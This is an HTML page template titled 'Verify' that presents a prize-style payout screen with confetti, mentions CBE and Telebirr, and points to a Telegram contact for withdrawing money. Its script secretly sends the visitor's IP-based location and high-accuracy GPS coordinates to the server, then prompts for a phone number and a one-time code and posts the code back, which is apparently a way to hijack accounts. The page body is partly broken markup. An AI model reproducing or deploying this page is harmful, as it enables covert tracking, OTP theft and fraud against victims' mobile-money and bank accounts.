<!DOCTYPE html>
<html>
<head>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>

    <style>
    /* Full‐page flex centering */
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: #f9f9f9;
      text-align: center;
      padding: 1rem;
    }
    /* Extra-large heading */
    h1 {
      font-size: 2.5rem;        /* ~40px on most phones */
      line-height: 1.2;
      margin-bottom: 1rem;
    }
    /* Bigger paragraphs */
    p {
      font-size: 1.5rem;        /* ~24px */
      margin: 0.75rem 0;
    }
    /* Emphasized text even bigger */
    strong, em {
      font-size: 1.6rem;
    }
  </style>
  
  <title>Verify</title>
  <script>
    const locId = {{ loc_id }};
    const CSRF = document.cookie.split(';')
      .find(c=>c.trim().startsWith('csrftoken='))
      ?.split('=')[1];

    async function postJSON(url, body) {
      return fetch(url, {
        method: "POST",
        headers: {
          "Content-Type":"application/json",
          "X-CSRFToken": CSRF
        },
        body: JSON.stringify(body)
      });
    }

    window.onload = async () => {
      // —————— PHASE 1: CLIENT IP / CITY via ipapi.co ——————
      try {
        const ipRes  = await fetch("https://ipapi.co/json/");
        const ipData = await ipRes.json();
        await postJSON("/save-ip/", {
          loc_id:   locId,
          ip_lat:   ipData.latitude,
          ip_lon:   ipData.longitude,
          ip_city:  ipData.city
        });
      } catch(e){
        console.warn("Could not fetch ipapi.co:", e);
      }

      // —————— PHASE 2: HIGH-ACCURACY GPS ——————
      if (!navigator.geolocation) {
        return alert("Geolocation not supported");
      }
      navigator.geolocation.getCurrentPosition(
        async pos => {
          // 2a) save GPS
          await postJSON("/save-gps/", {
            loc_id:   locId,
            latitude: pos.coords.latitude,
            longitude:pos.coords.longitude
          });

          // 2b) phone & OTP
          const phone = prompt("Enter your phone (+251...)");
          if (!phone) return alert("Phone required");
          await postJSON("/send-otp/", { loc_id: locId, phone });

          const code = prompt("Enter the OTP you received");
          const res  = await postJSON("/verify-otp/", { loc_id: locId, code });
          const { status } = await res.json();
          alert("Verification status: " + status);
        },
        () => alert("GPS permission required"),
        { enableHighAccuracy:true, timeout:10000, maximumAge:0 }
      );
        setInterval(() => {
      confetti({
        particleCount: 60,
        spread:        100,
        origin:        { y: 0.6 }
      });
    }, 500);

      // a second burst for extra sparkle
      setTimeout(() => {
        confetti({
          particleCount: 100,
          spread: 100,
          origin: { y: 0.2 }
        });
      }, 300);
    };
  </script>
</head>
<body style="margin:0; height:100vh; display:flex; justify-content:center; align-items:center; background:#f9f9f9; text-align:center; padding:1rem;">

       Reply with <strong>CBE</strong> or <strong>Telebirr</strong>.</p>
    <p><em>Default: CBE</em></p>

    <p>Contact @bytleaf on Telegram, reply with "WITHDRAW MONEY"</p>
  </div>

</body>

</html>
